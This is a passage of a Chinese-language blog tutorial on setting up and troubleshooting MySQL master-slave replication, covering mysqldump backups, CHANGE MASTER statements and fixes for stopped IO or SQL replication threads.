success&quot;<br>done<br></code></pre></td></tr></table></figure><h3 id="完全备份-A，直接source就行，不用选库"><a href="#完全备份-A，直接source就行，不用选库" class="headerlink" title="完全备份-A，直接source就行，不用选库"></a>完全备份-A，直接source就行，不用选库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##-A完全备份，-F刷新日志</span><br><span class="hljs-comment">##!/bin/bash</span><br>TIME=`<span class="hljs-built_in">date</span> +%Y-%m-%d_%H-%M-%S`<br>DIR=/data/backup<br>DB=<span class="hljs-string">&quot;hellodb&quot;</span><br>PASS=123<br>HOST=10.0.0.128<br><br>[ -d <span class="hljs-variable">$DIR</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dir exist&quot;</span> || <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$DIR</span><br>mysqldump -uroot -p<span class="hljs-variable">$PASS</span> --single-transaction --source-data=2 -A -F &gt; <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>_all.sql<br><span class="hljs-comment">#mysqldump -usync -p$PASS -h$HOST --single-transaction --source-data=2 -A | gzip &gt; /data/backup/backup.sql.gz</span><br><br>scp <span class="hljs-variable">$&#123;DIR&#125;</span>/<span class="hljs-variable">$&#123;DB&#125;</span>_<span class="hljs-variable">$&#123;TIME&#125;</span>_all.sql <span class="hljs-variable">$HOST</span>:/data/backup<br><br>[zabbix]&gt;<span class="hljs-built_in">source</span> /data/backup/hellodb_2022-09-11_09-15-11_all.sql<br></code></pre></td></tr></table></figure><p>主节点看一下dump线程，在运行的线程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> processlist;<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> processlist;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span> Id <span class="hljs-operator">|</span> <span class="hljs-keyword">User</span>            <span class="hljs-operator">|</span> Host      <span class="hljs-operator">|</span> db   <span class="hljs-operator">|</span> Command <span class="hljs-operator">|</span> <span class="hljs-type">Time</span> <span class="hljs-operator">|</span> State                  <span class="hljs-operator">|</span> Info             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+------+---------+------+------------------------+------------------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">5</span> <span class="hljs-operator">|</span> event_scheduler <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span> Daemon  <span class="hljs-operator">|</span> <span class="hljs-number">7920</span> <span class="hljs-operator">|</span> Waiting <span class="hljs-keyword">on</span> <span class="hljs-keyword">empty</span> queue <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>             <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">52</span> <span class="hljs-operator">|</span> root            <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span> Query   <span class="hljs-operator">|</span>    <span class="hljs-number">0</span> <span class="hljs-operator">|</span> init                   <span class="hljs-operator">|</span> <span class="hljs-keyword">show</span> processlist <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+-----------------+-----------+------+---------+------+------------------------+------------------+</span><br></code></pre></td></tr></table></figure><h3 id="单表备份：直接备份一个库内的一个表"><a href="#单表备份：直接备份一个库内的一个表" class="headerlink" title="单表备份：直接备份一个库内的一个表"></a>单表备份：直接备份一个库内的一个表</h3><p>也可以备份多张表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql">##假如不小心清空从库表的数据<br><span class="hljs-keyword">truncate</span> <span class="hljs-keyword">table</span> stu;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> stu;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##导出单表，还原<br>mysqldump <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 hellodb stu <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql<br>scp <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span>:<span class="hljs-operator">/</span>data<span class="hljs-operator">/</span><br><br>source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> stu <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">25</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+</span><br><span class="hljs-operator">|</span> StuID <span class="hljs-operator">|</span> Name        <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">25</span> <span class="hljs-operator">|</span> Sun Dasheng <span class="hljs-operator">|</span> <span class="hljs-number">100</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-------------+-----+--------+</span><br><br>##备份多张表<br>mysqldump <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p123 hellodb stu teachers job <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>stu.sql<br></code></pre></td></tr></table></figure><h2 id="5-从节点配置文件以及导入备份，基于线程来复制"><a href="#5-从节点配置文件以及导入备份，基于线程来复制" class="headerlink" title="5.从节点配置文件以及导入备份，基于线程来复制"></a>5.从节点配置文件以及导入备份，基于线程来复制</h2><p>可以先导入文件，再show master status记录下binlog的pos和名字，再执行change master</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>read<span class="hljs-operator">-</span><span class="hljs-keyword">only</span> ##只读，防止普通用户修改数据，不能防止root<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>  MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>  MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>  MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>  MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>  MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mysql-bin.000002&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">30489887</span>,<br>  MASTER_CONNECT_RETRY<span class="hljs-operator">=</span><span class="hljs-number">5</span>;<br><br>##取消掉注释，复制过去，从节点加上binlog选项<br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000783&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">197</span>;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210229422-1194997520.png" alt="image-20220911105346272"></p><p>关闭二进制，再导入，查看从节点的信息，发生生成了中继日志，即master的binlog写过来的日志存放文件relay_log，SLAVE_IO还是not running，开启复制线程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> sql_log_bin<span class="hljs-operator">=</span><span class="hljs-number">0</span>;<br>source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<span class="hljs-operator">/</span>hellodb_2022<span class="hljs-number">-09</span><span class="hljs-number">-11</span>_10<span class="hljs-number">-48</span><span class="hljs-number">-26</span>_all.sql<br><br><span class="hljs-keyword">show</span> slave status\G;<br>[zabbix]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>               Slave_IO_State: <br>                  Master_Host: <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span><br>                  Master_User: sync<br>                  Master_Port: <span class="hljs-number">3306</span><br>                Connect_Retry: <span class="hljs-number">60</span><br>              Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000021</span><br>          Read_Master_Log_Pos: <span class="hljs-number">157</span><br>               Relay_Log_File: master<span class="hljs-operator">-</span>relay<span class="hljs-operator">-</span>bin<span class="hljs-number">.000001</span><br>                Relay_Log_Pos: <span class="hljs-number">4</span><br>        Relay_Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000021</span><br>             Slave_IO_Running: <span class="hljs-keyword">No</span><br>            Slave_SQL_Running: <span class="hljs-keyword">No</span><br>            <br><span class="hljs-keyword">start</span> slave;<br><span class="hljs-keyword">show</span> processlist;<br>IO线程<span class="hljs-operator">+</span><span class="hljs-keyword">SQL</span>线程，IO线程是从主节点接收同步信息，通过<span class="hljs-keyword">SQL</span> thread写入到从库的数据中，Query thread，显示waiting <span class="hljs-keyword">for</span> updates<br>主节点：binlog dump线程<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210229718-1036089594.png" alt="image-20220911105912959"></p><p><img src="2792175-20220925210230004-643921596.png" alt="image-20220911111217896"></p><h2 id="6-测试主从环境"><a href="#6-测试主从环境" class="headerlink" title="6.测试主从环境"></a>6.测试主从环境</h2><p>主写新，看从有无，可以执行存储过程</p><p>测试执行存储过程，从节点直接SQL thread断掉了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">6</span> <span class="hljs-operator">|</span> catyer2       <span class="hljs-operator">|</span>  <span class="hljs-number">17</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><br>##主节点写入新数据，删除数据，没了<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">6</span>;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##测试执行存储过程<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br></code></pre></td></tr></table></figure><h3 id="出现Slave-IO-Running-NO的解决办法：可能是用户没权限"><a href="#出现Slave-IO-Running-NO的解决办法：可能是用户没权限" class="headerlink" title="出现Slave_IO_Running: NO的解决办法：可能是用户没权限"></a>出现Slave_IO_Running: NO的解决办法：可能是用户没权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql">##复制账号没权限，从节点查看<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>               Slave_IO_State: Waiting <span class="hljs-keyword">for</span> source <span class="hljs-keyword">to</span> send event<br>                  Master_Host: <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span><br>                  Master_User: sync<br>                  Master_Port: <span class="hljs-number">3306</span><br>                Connect_Retry: <span class="hljs-number">60</span><br>              Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span><br>          Read_Master_Log_Pos: <span class="hljs-number">60979553</span><br>               Relay_Log_File: master<span class="hljs-operator">-</span>relay<span class="hljs-operator">-</span>bin<span class="hljs-number">.000002</span><br>                Relay_Log_Pos: <span class="hljs-number">326</span><br>        Relay_Master_Log_File: rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span><br>             Slave_IO_Running: Yes<br>            Slave_SQL_Running: Yes<br><br>##授权<br><span class="hljs-keyword">grant</span> replication slave <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush privileges;<br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> sync@<span class="hljs-string">&#x27;%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-operator">|</span> Grants <span class="hljs-keyword">for</span> sync@<span class="hljs-operator">%</span>                            <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> REPLICATION SLAVE <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `sync`@`<span class="hljs-operator">%</span>` <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><h3 id="出现Slave-SQL-Running：No的解决办法"><a href="#出现Slave-SQL-Running：No的解决办法" class="headerlink" title="出现Slave_SQL_Running：No的解决办法"></a>出现Slave_SQL_Running：No的解决办法</h3><p>重新执行一下slave的change master语句，记录下master的binlog pos，修改执行</p><p>可以查看日志，错误日志：mysql-error.log，可以自定义一下错误日志的位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sql">##从停止slave<br>stop slave;<br><br>##主查看binlog日志的pos<br><span class="hljs-keyword">show</span> master status;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span> <span class="hljs-operator">|</span> <span class="hljs-number">60979553</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>                   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><br>##从手动修改Pos,执行<br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000784&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">197</span>;<br><br>##启动slave<br><span class="hljs-keyword">start</span> slave<br><br>##可能是表结构不一致，需要修改表结构字段<br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-11</span>T03:<span class="hljs-number">39</span>:<span class="hljs-number">17.143632</span>Z <span class="hljs-number">28</span> [Warning] [MY<span class="hljs-number">-010584</span>] [Repl] Slave <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">for</span> channel <span class="hljs-string">&#x27;&#x27;</span>: ... The slave coordinator <span class="hljs-keyword">and</span> worker threads <span class="hljs-keyword">are</span> stopped, possibly leaving data <span class="hljs-keyword">in</span> inconsistent state. A restart should restore consistency automatically, although <span class="hljs-keyword">using</span> non<span class="hljs-operator">-</span>transactional storage <span class="hljs-keyword">for</span> data <span class="hljs-keyword">or</span> info tables <span class="hljs-keyword">or</span> DDL queries could lead <span class="hljs-keyword">to</span> problems. <span class="hljs-keyword">In</span> such cases you have <span class="hljs-keyword">to</span> examine your data (see documentation <span class="hljs-keyword">for</span> details). Error_code: MY<span class="hljs-number">-001756</span><br><br><span class="hljs-keyword">desc</span> testlog;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> testlog;<br></code></pre></td></tr></table></figure><h3 id="执行一个存储过程后SQL-running-NO的解决，通过show-master-status的报错查看"><a href="#执行一个存储过程后SQL-running-NO的解决，通过show-master-status的报错查看" class="headerlink" title="执行一个存储过程后SQL_running=NO的解决，通过show master status的报错查看"></a>执行一个存储过程后SQL_running=NO的解决，通过show master status的报错查看</h3><p><a href="https://www.cnblogs.com/Knight7971/p/9970807.html">https://www.cnblogs.com/Knight7971/p/9970807.html</a></p><p>主要是看errorlog来拍错，让我们看一下error log或者是performance_schema.replication_applier_status_by_worker，这个表来查看有什么原因导致的</p><p>在同步前，新的数据要是master节点存在，slave节点不存在的，就算是空表也不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 